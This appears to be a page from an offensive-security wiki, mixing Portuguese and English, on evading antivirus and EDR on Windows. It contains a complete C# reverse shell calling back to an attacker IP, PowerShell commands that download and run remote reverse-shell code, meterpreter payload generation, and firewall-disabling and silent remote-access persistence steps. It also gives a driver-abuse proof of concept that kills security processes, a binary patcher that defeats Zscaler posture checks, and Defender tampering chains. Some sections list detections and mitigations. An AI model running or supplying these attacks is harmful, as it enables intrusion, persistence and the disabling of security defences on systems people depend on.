Here is a demo for bypassing SmartScreen by packaging payloads inside ISO files using [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) é um poderoso mecanismo de registro no Windows que permite que aplicações e componentes do sistema **registrem eventos**. No entanto, também pode ser usado por produtos de segurança para monitorar e detectar atividades maliciosas.

De maneira similar a como a AMSI é desativada (contornada) também é possível fazer com que a função **`EtwEventWrite`** do processo em espaço de usuário retorne imediatamente sem registrar quaisquer eventos. Isso é feito patchando a função na memória para que retorne imediatamente, efetivamente desativando o registro do ETW para esse processo.

You can find more info in **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) and [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.


## C# Assembly Reflection

Carregar binários C# em memória é conhecido há bastante tempo e ainda é uma ótima forma de executar suas ferramentas de pós-exploração sem ser detectado pelo AV.

Como o payload será carregado diretamente na memória sem tocar no disco, só precisaremos nos preocupar em patchar a AMSI para todo o processo.

A maioria dos frameworks C2 (sliver, Covenant, metasploit, CobaltStrike, Havoc, etc.) já oferece a capacidade de executar assemblies C# diretamente em memória, mas existem diferentes maneiras de fazer isso:

- **Fork\&Run**

Envolve **criar um novo processo sacrificial**, injetar seu código malicioso de pós-exploração nesse novo processo, executar o código malicioso e, quando terminar, matar o novo processo. Isso tem tanto benefícios quanto desvantagens. A vantagem do método fork and run é que a execução ocorre **fora** do nosso processo implantado Beacon. Isso significa que se algo na nossa ação de pós-exploração der errado ou for detectado, há uma **chance muito maior** de nosso **implant sobreviver.** A desvantagem é que você tem uma **maior chance** de ser pego por **Detecções Comportamentais**.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Trata-se de injetar o código malicioso de pós-exploração **no próprio processo**. Dessa forma, você pode evitar criar um novo processo e que ele seja escaneado pelo AV, mas a desvantagem é que se algo der errado na execução do seu payload, há uma **chance muito maior** de **perder seu beacon**, pois ele pode travar.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Se quiser saber mais sobre carregamento de Assembly C#, confira este artigo [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) e o BOF InlineExecute-Assembly ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

Você também pode carregar Assemblies C# **a partir do PowerShell**, veja [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) e o vídeo de S3cur3th1sSh1t (https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Using Other Programming Languages

As proposed in [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), it's possible to execute malicious code using other languages by giving the compromised machine access **to the interpreter environment installed on the Attacker Controlled SMB share**.

By allowing access to the Interpreter Binaries and the environment on the SMB share you can **execute arbitrary code in these languages within memory** of the compromised machine.

The repo indicates: Defender still scans the scripts but by utilising Go, Java, PHP etc we have **more flexibility to bypass static signatures**. Testing with random un-obfuscated reverse shell scripts in these languages has proved successful.

## TokenStomping

Token stomping é uma técnica que permite a um atacante **manipular o token de acesso ou um produto de segurança como um EDR ou AV**, permitindo reduzir seus privilégios de modo que o processo não morra, mas não terá permissões para verificar atividades maliciosas.

To prevent this Windows could **prevent external processes** from getting handles over the tokens of security processes.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Using Trusted Software

### Chrome Remote Desktop

As described in [**this blog post**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), it's easy to just deploy the Chrome Remote Desktop in a victims PC and then use it to takeover it and maintain persistence:
1. Download from https://remotedesktop.google.com/, click on "Set up via SSH", and then click on the MSI file for Windows to download the MSI file.
2. Run the installer silently in the victim (admin required): `msiexec /i chromeremotedesktophost.msi /qn`
3. Go back to the Chrome Remote Desktop page and click next. The wizard will then ask you to authorize; click the Authorize button to continue.
4. Execute the given parameter with some adjustments: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (Observe o parâmetro pin que permite definir o PIN sem usar a GUI).


## Advanced Evasion

Evasion é um tópico muito complicado; às vezes você precisa levar em conta muitas fontes diferentes de telemetria em um único sistema, então é praticamente impossível permanecer completamente indetectado em ambientes maduros.

Cada ambiente contra o qual você atua terá seus próprios pontos fortes e fracos.

Eu recomendo fortemente que assista a esta palestra de [@ATTL4S](https://twitter.com/DaniLJ94), para obter uma base em técnicas de Evasão Avançada.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Esta é também outra ótima palestra de [@mariuszbit](https://twitter.com/mariuszbit) sobre Evasion in Depth.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Old Techniques**

### **Check which parts Defender finds as malicious**

Você pode usar [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) que irá **remover partes do binário** até **descobrir qual parte o Defender** está identificando como maliciosa e apresentá-la a você.\
Outra ferramenta fazendo **a mesma coisa é** [**avred**](https://github.com/dobin/avred) com um serviço web aberto em [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Telnet Server**

Até o Windows10, todas as versões do Windows vinham com um **Telnet server** que você podia instalar (como administrador) fazendo:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
Faça com que ele **inicie** quando o sistema for iniciado e **execute**-o agora:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**Alterar porta do telnet** (furtivo) e desativar firewall:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Faça o download em: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (você quer os downloads binários, não o instalador)

**ON THE HOST**: Execute _**winvnc.exe**_ e configure o servidor:

- Habilite a opção _Disable TrayIcon_
- Defina uma senha em _VNC Password_
- Defina uma senha em _View-Only Password_

Em seguida, mova o binário _**winvnc.exe**_ e o arquivo _**UltraVNC.ini**_ recém-criado para dentro da **vítima**

#### **Reverse connection**

O **atacante** deve **executar no** seu **host** o binário `vncviewer.exe -listen 5900` para que fique **preparado** para receber uma conexão VNC reversa. Então, dentro da **vítima**: Inicie o daemon winvnc `winvnc.exe -run` e execute `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**WARNING:** Para manter a furtividade você não deve fazer algumas coisas

- Não inicie `winvnc` se ele já estiver em execução ou você acionará um [popup](https://i.imgur.com/1SROTTl.png). Verifique se está em execução com `tasklist | findstr winvnc`
- Não inicie `winvnc` sem o `UltraVNC.ini` no mesmo diretório ou isso fará a [janela de configuração](https://i.imgur.com/rfMQWcf.png) abrir
- Não execute `winvnc -h` para ajuda ou você acionará um [popup](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Faça o download em: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
Dentro do GreatSCT:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
Agora **inicie o lister** com `msfconsole -r file.rc` e **execute** o **xml payload** com:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**O Defender atual encerrará o processo muito rapidamente.**

### Compilando nosso próprio reverse shell

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Primeiro C# Revershell

Compile com:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
Use com:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# usando o compilador
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Download e execução automáticos:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Lista de obfuscadores para C#: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Usando python para criar exemplos de injectors:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Outras ferramentas
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### Mais

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Eliminando AV/EDR a partir do espaço do kernel

Storm-2603 aproveitou uma pequena ferramenta de console conhecida como **Antivirus Terminator** para desativar proteções endpoint antes de dropar ransomware. A ferramenta traz seu **próprio driver vulnerável mas *assinado*** e o abusa para emitir operações privilegiadas no kernel que até serviços AV com Protected-Process-Light (PPL) não conseguem bloquear.

Principais pontos
1. **Signed driver**: O arquivo entregue no disco é `ServiceMouse.sys`, mas o binário é o driver legitimamente assinado `AToolsKrnl64.sys` do “System In-Depth Analysis Toolkit” da Antiy Labs. Como o driver possui uma assinatura válida da Microsoft, ele é carregado mesmo quando Driver-Signature-Enforcement (DSE) está habilitado.
2. **Service installation**:
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
A primeira linha registra o driver como um **kernel service** e a segunda o inicia para que `\\.\ServiceMouse` se torne acessível a partir do espaço do usuário.
3. **IOCTLs exposed by the driver**
| Código IOCTL | Capacidade                              |
|-----------:|-----------------------------------------|
| `0x99000050` | Terminar um processo arbitrário por PID (usado para matar serviços Defender/EDR) |
| `0x990000D0` | Deletar um arquivo arbitrário no disco |
| `0x990001D0` | Descarregar o driver e remover o serviço |

Minimal C proof-of-concept:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **Why it works**:  BYOVD ignora completamente as proteções em user-mode; código que executa no kernel pode abrir processos *protegidos*, terminá-los ou manipular objetos do kernel independentemente de PPL/PP, ELAM ou outras funcionalidades de hardening.

Detecção / Mitigação
•  Habilitar a lista de bloqueio de drivers vulneráveis da Microsoft (`HVCI`, `Smart App Control`) para que o Windows se recuse a carregar `AToolsKrnl64.sys`.  
•  Monitorar a criação de novos *kernel* services e alertar quando um driver é carregado a partir de um diretório gravável globalmente ou não estiver presente na allow-list.  
•  Monitorar handles em user-mode a objetos de dispositivo customizados seguidos por chamadas suspeitas a `DeviceIoControl`.

### Bypassing Zscaler Client Connector Posture Checks via On-Disk Binary Patching

O **Client Connector** da Zscaler aplica regras de posture do dispositivo localmente e depende de RPC do Windows para comunicar os resultados a outros componentes. Duas escolhas de design fracas tornam um bypass completo possível:

1. A avaliação de posture acontece **inteiramente no cliente** (um booleano é enviado ao servidor).  
2. Endpoints RPC internos só validam que o executável conectando está **assinado pela Zscaler** (via `WinVerifyTrust`).

Ao **patchar quatro binários assinados no disco** ambos os mecanismos podem ser neutralizados:

| Binário | Lógica original alterada | Resultado |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Sempre retorna `1`, então toda verificação é considerada compliant |
| `ZSAService.exe` | Chamada indireta para `WinVerifyTrust` | NOP-ed ⇒ qualquer processo (mesmo não assinado) pode se conectar aos pipes RPC |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Substituída por `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Checagens de integridade no túnel | Curto-circuitado |

Trecho mínimo do patcher:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
Depois de substituir os arquivos originais e reiniciar a pilha de serviços:

* **Todas** as verificações de postura exibem **verde/conforme**.
* Binários não assinados ou modificados podem abrir os endpoints RPC de named-pipe (p.ex. `\\RPC Control\\ZSATrayManager_talk_to_me`).
* O host comprometido ganha acesso irrestrito à rede interna definida pelas políticas do Zscaler.

Este estudo de caso demonstra como decisões de confiança puramente do lado do cliente e verificações simples de assinatura podem ser derrotadas com alguns patches de bytes.

## Abusing Protected Process Light (PPL) To Tamper AV/EDR With LOLBINs

Protected Process Light (PPL) enforces a signer/level hierarchy so that only equal-or-higher protected processes can tamper with each other. Offensively, if you can legitimately launch a PPL-enabled binary and control its arguments, you can convert benign functionality (e.g., logging) into a constrained, PPL-backed write primitive against protected directories used by AV/EDR.

O que faz um processo ser executado como PPL
- O EXE alvo (e quaisquer DLLs carregadas) deve ser assinado com um EKU compatível com PPL.
- O processo deve ser criado com CreateProcess usando as flags: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- Deve ser solicitado um nível de proteção compatível que corresponda ao assinante do binário (por exemplo, `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` para assinantes anti-malware, `PROTECTION_LEVEL_WINDOWS` para assinantes Windows). Níveis incorretos falharão na criação.

Veja também uma introdução mais ampla a PP/PPL e à proteção do LSASS aqui:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Launcher tooling
- Auxiliar de código aberto: CreateProcessAsPPL (seleciona o nível de proteção e encaminha os argumentos para o EXE de destino):
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- Padrão de uso:
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
Primitiva LOLBIN: ClipUp.exe
- O binário de sistema assinado `C:\Windows\System32\ClipUp.exe` inicia instâncias de si mesmo e aceita um parâmetro para gravar um arquivo de log em um caminho especificado pelo chamador.
- Quando lançado como um processo PPL, a escrita do arquivo ocorre com suporte do PPL.
- O ClipUp não consegue analisar caminhos que contenham espaços; use caminhos curtos 8.3 para apontar para locais normalmente protegidos.

8.3 short path helpers
- Liste nomes curtos: `dir /x` em cada diretório pai.
- Obtenha o caminho curto no cmd: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Cadeia de abuso (abstrata)
1) Inicie a LOLBIN compatível com PPL (ClipUp) com `CREATE_PROTECTED_PROCESS` usando um launcher (por exemplo, CreateProcessAsPPL).
2) Passe o argumento log-path do ClipUp para forçar a criação de um arquivo em um diretório AV protegido (por exemplo, Defender Platform). Use nomes curtos 8.3 se necessário.
3) Se o binário alvo estiver normalmente aberto/bloqueado pelo AV enquanto estiver em execução (por exemplo, MsMpEng.exe), agende a escrita na inicialização antes do AV iniciar instalando um serviço de auto-início que execute de forma confiável mais cedo. Valide a ordem de boot com Process Monitor (boot logging).
4) No reinício, a escrita suportada pelo PPL ocorre antes do AV bloquear seus binários, corrompendo o arquivo alvo e impedindo a inicialização.

Exemplo de invocação (caminhos redigidos/encurtados por segurança):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
Notas e restrições
- Você não pode controlar o conteúdo que o ClipUp grava além do local; a primitiva é adequada para corrupção em vez de injeção precisa de conteúdo.
- Requer administrador local/SYSTEM para instalar/iniciar um serviço e uma janela para reboot.
- O tempo é crítico: o alvo não pode estar aberto; a execução na inicialização evita bloqueios de arquivo.

Detecções
- Criação do processo de `ClipUp.exe` com argumentos incomuns, especialmente quando parentalizado por iniciadores não padrão, durante a inicialização.
- Novos serviços configurados para início automático de binários suspeitos e que consistentemente iniciam antes do Defender/AV. Investigar criação/modificação de serviços anteriores a falhas de inicialização do Defender.
- Monitoramento de integridade de arquivo nos binários do Defender/diretórios Platform; criações/modificações de arquivos inesperadas por processos com flags de protected-process.
- Telemetria ETW/EDR: procurar processos criados com `CREATE_PROTECTED_PROCESS` e uso anômalo de níveis PPL por binários não-AV.

Mitigações
- WDAC/Code Integrity: restringir quais binários assinados podem rodar como PPL e sob quais pais; bloquear invocação do ClipUp fora de contextos legítimos.
- Higiene de serviços: restringir criação/modificação de serviços com início automático e monitorar manipulação da ordem de inicialização.
- Garantir que a proteção contra adulteração (tamper protection) e as proteções de early-launch do Defender estejam habilitadas; investigar erros de inicialização que indiquem corrupção de binários.
- Considerar desabilitar a geração de nomes curtos 8.3 em volumes que hospedam ferramentas de segurança, se compatível com seu ambiente (testar cuidadosamente).

Referências para PPL e ferramentas
- Visão geral do Microsoft Protected Processes: https://learn.microsoft.com/windows/win32/procthread/protected-processes
- Referência EKU: https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88
- Procmon boot logging (validação de ordenação): https://learn.microsoft.com/sysinternals/downloads/procmon
- Launcher CreateProcessAsPPL: https://github.com/2x7EQ13/CreateProcessAsPPL
- Descrição da técnica (ClipUp + PPL + boot-order tamper): https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html

## Manipulação do Microsoft Defender via Platform Version Folder Symlink Hijack

Windows Defender escolhe a plataforma de onde é executado enumerando subpastas em:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

Ele seleciona a subpasta com a maior string de versão lexicográfica (p.ex., `4.18.25070.5-0`), então inicia os processos de serviço do Defender a partir daí (atualizando caminhos de serviço/registry conforme necessário). Essa seleção confia em entradas de diretório incluindo directory reparse points (symlinks). Um administrador pode explorar isso para redirecionar o Defender para um caminho gravável pelo atacante e conseguir DLL sideloading ou interrupção do serviço.

Pré-requisitos
- Administrador local (necessário para criar diretórios/symlinks sob a pasta Platform)
- Capacidade de reiniciar ou acionar a re-seleção da plataforma do Defender (reinício do serviço na inicialização)
- Apenas ferramentas integradas requeridas (mklink)

Por que funciona
- O Defender bloqueia gravações em suas próprias pastas, mas a seleção de plataforma confia em entradas de diretório e escolhe a versão lexicograficamente mais alta sem validar que o alvo resolva para um caminho protegido/confiável.

Passo a passo (exemplo)
1) Prepare um clone gravável da pasta Platform atual, p.ex. `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Crie um symlink de diretório de versão superior dentro de Platform apontando para sua pasta:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Seleção de gatilho (reinicialização recomendada):
```cmd
shutdown /r /t 0
```
4) Verifique se MsMpEng.exe (WinDefend) está sendo executado a partir do caminho redirecionado:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
Você deve observar o novo caminho do processo em `C:\TMP\AV\` e a configuração/registro do serviço refletindo essa localização.

Post-exploitation options
- DLL sideloading/code execution: Coloque/substitua DLLs que o Defender carrega do seu diretório de aplicação para executar código nos processos do Defender. Veja a seção acima: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Service kill/denial: Remova o version-symlink para que, na próxima inicialização, o caminho configurado não seja resolvido e o Defender falhe ao iniciar:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```
> [!TIP]
> Observe que esta técnica não fornece escalonamento de privilégios por si só; requer privilégios de administrador.

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

Red teams podem mover a evasão em tempo de execução para fora do C2 implant e para o próprio módulo alvo, fazendo hooking da sua Import Address Table (IAT) e roteando APIs selecionadas através de position‑independent code (PIC) controlado pelo atacante. Isso generaliza a evasão além da pequena superfície de API que muitos kits expõem (por exemplo, CreateProcessA) e estende as mesmas proteções a BOFs e DLLs de pós‑exploração.

High-level approach
- Stage a PIC blob alongside the target module using a reflective loader (prepended or companion). The PIC must be self‑contained and position‑independent.
- As the host DLL loads, walk its IMAGE_IMPORT_DESCRIPTOR and patch the IAT entries for targeted imports (e.g., CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc) to point at thin PIC wrappers.
- Each PIC wrapper executes evasions before tail‑calling the real API address. Typical evasions include:
- Memory mask/unmask around the call (e.g., encrypt beacon regions, RWX→RX, change page names/permissions) then restore post‑call.
- Call‑stack spoofing: construir uma pilha benign e transitar para a API alvo de modo que a análise da call‑stack resulte nos frames esperados.
- For compatibility, export an interface so an Aggressor script (or equivalent) can register which APIs to hook for Beacon, BOFs and post‑ex DLLs.

Why IAT hooking here
- Works for any code that uses the hooked import, without modifying tool code or relying on Beacon to proxy specific APIs.
- Covers post‑ex DLLs: hooking LoadLibrary* lets you intercept module loads (e.g., System.Management.Automation.dll, clr.dll) and apply the same masking/stack evasion to their API calls.
- Restores reliable use of process‑spawning post‑ex commands against call‑stack–based detections by wrapping CreateProcessA/W.

Minimal IAT hook sketch (x64 C/C++ pseudocode)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Notas
- Aplique o patch após relocations/ASLR e antes do primeiro uso da importação. Reflective loaders como TitanLdr/AceLdr demonstram hooking durante DllMain do módulo carregado.
- Mantenha wrappers pequenos e PIC-safe; resolva a API verdadeira via o valor original da IAT que você capturou antes do patch ou via LdrGetProcedureAddress.
- Use transições RW → RX para PIC e evite deixar páginas writables+executáveis.

Call‑stack spoofing stub
- Draugr‑style PIC stubs constroem uma cadeia de chamadas falsa (endereços de retorno em módulos benignos) e então pivoteiam para a API real.
- Isso derrota detecções que esperam stacks canônicos de Beacon/BOFs para APIs sensíveis.
- Combine com técnicas de stack cutting/stack stitching para aterrissar dentro dos frames esperados antes do prólogo da API.

Integração operacional
- Prepend o reflective loader aos post‑ex DLLs para que o PIC e os hooks inicializem automaticamente quando a DLL for carregada.
- Use um Aggressor script para registrar APIs alvo de modo que Beacon e BOFs se beneficiem de forma transparente do mesmo caminho de evasão sem alterações de código.

Considerações de Detecção/DFIR
- Integridade da IAT: entradas que resolvem para endereços non‑image (heap/anon); verificação periódica dos ponteiros de import.
- Anomalias de stack: endereços de retorno que não pertencem a imagens carregadas; transições abruptas para PIC non‑image; ancestralidade inconsistente de RtlUserThreadStart.
- Telemetria do loader: writes in‑process para a IAT, atividade precoce em DllMain que modifica import thunks, regiões RX inesperadas criadas no load.
- Evasão por carregamento de imagem: se hookando LoadLibrary*, monitore loads suspeitos de automation/clr assemblies correlacionados com eventos de masking de memória.

Blocos de construção relacionados e exemplos
- Reflective loaders que fazem IAT patching durante o load (e.g., TitanLdr, AceLdr)
- Memory masking hooks (e.g., simplehook) e stack‑cutting PIC (stackcutting)
- PIC call‑stack spoofing stubs (e.g., Draugr)


## Hooking de IAT em tempo de importação + Ofuscação de Sleep (Crystal Palace/PICO)

### Import-time IAT hooks via a resident PICO

Se você controla um reflective loader, pode hookar imports **durante** `ProcessImports()` substituindo o ponteiro `GetProcAddress` do loader por um resolvedor customizado que verifica hooks primeiro:

- Construa um **resident PICO** (objeto PIC persistente) que sobreviva depois que o PIC transitório do loader for liberado.
- Exporte uma função `setup_hooks()` que sobrescreva o resolvedor de import do loader (e.g., `funcs.GetProcAddress = _GetProcAddress`).
